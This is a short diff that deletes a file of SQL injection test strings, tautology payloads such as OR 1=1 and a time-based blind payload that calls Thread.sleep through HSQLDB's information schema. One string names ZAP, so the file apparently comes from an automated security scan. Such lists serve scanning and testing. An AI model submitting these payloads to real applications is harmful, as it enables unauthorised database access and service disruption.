@@ -1,8 +1,0 @@
-bar' AND '1'='1' -- 
-bar OR 1=1 -- 
-whatever AND 1=1 -- 
-whatever" AND "1"="1
-whatever AND 1=1
-ZAP" AND "1"="1
-'; select "java.lang.Thread.sleep"(5000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- 
-'; select "java.lang.Thread.sleep"(5000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- 
